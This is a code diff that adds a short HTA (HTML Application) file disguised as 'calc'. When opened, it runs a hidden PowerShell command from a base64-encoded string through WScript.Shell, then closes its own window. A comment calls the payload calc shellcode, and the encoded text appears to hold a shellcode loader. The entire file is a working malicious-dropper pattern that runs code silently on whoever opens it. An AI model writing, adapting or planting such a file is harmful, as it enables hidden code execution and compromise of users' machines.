@@ -1,0 +1,18 @@
+<html>
+<head>
+<hta:application id="calc" border="thin" borderstyle="complex" applicationname="calc" caption="no" showintaskbar="no" windowstate="minimize" />
+<script language="javascript">
+    var shell = new ActiveXObject("WScript.Shell");
+    var payload = (
+      "JABzAD0AWwBTAGUAdABdADoAOgBCAHkAdABlAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtA" +
+      "EIAAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIAZgBjAEUAQgBBAEEAQQBLAEIASQBEAEEAQQBBAC" +
+      "IAKQA7ACQAYgA9AFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABT" +
+      "AGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEEAbABsAG8AYwBIAGcAUAByAG8AYw" +
+      "BlAHMAcwAoACQAcwAuAEwAZQBuAGcAdABoACkAOwAkAGIALgBDAG8AcAB5ACgAJABzACwAMAA="); // Base64'd PowerShell to run calc shellcode
+
+    shell.Run("powershell -nop -w hidden -EncodedCommand " + payload);
+    window.close();
+</script>
+</head>
+<body></body>
+</html>
